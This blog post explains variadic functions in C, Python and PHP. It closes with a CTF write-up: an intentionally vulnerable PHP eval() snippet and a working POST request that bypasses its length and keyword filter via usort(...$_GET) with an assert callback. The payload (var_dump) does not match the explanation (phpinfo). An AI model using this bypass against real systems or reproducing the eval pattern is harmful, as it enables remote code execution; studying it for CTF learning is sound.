---
title: 由phithon的一个题目谈可变参数函数
url: 513.html
id: 513
categories:
  - hack_ctf
date: 2017-01-20 16:11:23
tags:
  - code
  - ctf
---



###  可变参数函数
可变参数函数是指参数个数可变的函数,在函数声明和定义的时候并没有明确的指出函数需要的参数个数,具体有多少个参数,是在调用的时候确定的.
可变参数函数并不是什么新奇的东西,早在我们学c语言的时候,就见过,例如我们常用的printf()和scanf()函数.
printf() 的函数原型是

<!--more-->

```c
int　printf(const char* format,...);    //至少要有一个参数 
```
我们写下面的代码看一下：
```c
#include "stdio.h"
int main(){
  int  param1=1,param2=2;
printf("一个参数:%d\n",param1);
printf("一个参数:%d,第二个参数：%d\n",param1,param2);
return 0;
}
```
我们都会用这样的函数，但是却没用自己动手写过可便参数的函数．　
### 自己动手写可变参数的函数  
在c语言中要实现一个可变参函数,需要用到一下的宏
```c
void va_start( va_list arg_ptr, prev_param );
type va_arg( va_list arg_ptr, type );
void va_end( va_list arg_ptr );
```
这些宏定义在stdarg.h头文件中,所以在写可变参数函数的时候需要包含此头文件. gcc编译器使用内置宏间接实现变参宏，如#define va_start(v,l)  __builtin_va_start(v,l)。因为gcc编译器需要考虑跨平台处理，而其实现因平台而异。
 C调用约定下可使用va_list系列变参宏实现变参函数，此处va意为variable-argument(可变参数)。典型用法如下：
```c
#include <stdarg.h>
int VarArgFunc(int dwFixedArg, ...){ //以固定参数的地址为起点依次确定各变参的内存起始地址
    va_list pArgs = NULL;  //定义va_list类型的指针pArgs，用于存储参数地址
    va_start(pArgs, dwFixedArg); //初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数
    int dwVarArg = va_arg(pArgs, int); //该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型
    //若函数有多个可变参数，则依次调用va_arg宏获取各个变参
    va_end(pArgs);  //将指针pArgs置为无效，结束变参的获取
    /* Code Block using variable arguments */
}
//可在头文件中声明函数为extern int VarArgFunc(int dwFixedArg, ...);，调用时用VarArgFunc(FixedArg, VarArg);
```
如下函数实现n个整数相加(n>=1),但是定义函数之前并不知道到底是几个数相加,代码如下
```c
int sum(int n, ...)  //第一个参数表明有可变参数有多少个相加  
{
    va_list ap;
    va_start(ap, n);
    int sum = 0;
    while(n--)
        sum += va_arg(ap, int);
    va_end(ap);
    return sum;
}
```
### python 中的可变参数函数
python中定义函数,可以使用*args和**kwargs将不定量的参数传递给一个函数,*args发送一个非键值对的可变数量的参数列表给一个函数，**kwargs允许你将不定长度的键值对(key,value), 作为参数传递给一个函数。
例子如下:
```python
#!/usr/bin/python 
#-*-coding:utf-8-*-  
def function1(arg1,arg2,arg3):
    # print "function1"
    print "arg1:",arg1
    print "arg2:",arg2
    print "arg3:",arg3
def function2(*args):
    for arg in args:
        print "arg from args:",arg 
def function3(**kwargs):
    for key,value in kwargs.items():
        print "{key}=={value}".format(key=key,value=value)


function1("one","two","three")
args=("one","two","three")
function2(*args)
kwargs={"1":"one","2":"two"}
function3(**kwargs)
```
最后的输出:
```bash
arg1: one
arg2: two
arg3: three
arg from args: one
arg from args: two
arg from args: three
1==one
2==two
```
###  php中的可变参函数 
php5.6引入了一个新特性,PHP中可以使用 `func(...$arr)`这样的方式，将`$arr`数组展开成多个参数，传入func函数。[Manual](http://php.net/manual/zh/migration56.new-features.php)
```php

<?php
function f($req, $opt = null, ...$params) {
    // $params 是一个包含了剩余参数的数组
    printf('$req: %d; $opt: %d; number of params: %d'."\n",
           $req, $opt, count($params));
}
f(1);
f(1, 2);
f(1, 2, 3);
f(1, 2, 3, 4);
f(1, 2, 3, 4, 5);
?>
```
最后的输出:
```bash
$req: 1; $opt: 0; number of params: 0
$req: 1; $opt: 2; number of params: 0
$req: 1; $opt: 2; number of params: 1
$req: 1; $opt: 2; number of params: 2
$req: 1; $opt: 2; number of params: 3
```
### 最后来看phithon的题目:
```php
<?php
$param = $_REQUEST['param'];
if(strlen($param)<17 && stripos($param,'eval') === false && stripos($param,'assert') === false) {
  eval($param);
}
?> 
```
###### 要求必须getshell  
phithon 给出的标准答案是:
```
POST /index.php?1[]=test&1[]=var_dump($_SERVER);&2=assert HTTP/1.1
Host: localhost:8081
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

param=usort(...$_GET); 
```
$_GET变量 被展开为两个参数 ['test','phpinfo();']和assert,传入usort函数.usort函数第二个参数是回调函数assert,执行了第一个参数中的phpinfo(). 这样就可以达到getshell的效果.

### reference
[https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)

[http://www.cnblogs.com/clover-toeic/p/3736748.html](http://www.cnblogs.com/clover-toeic/p/3736748.html)

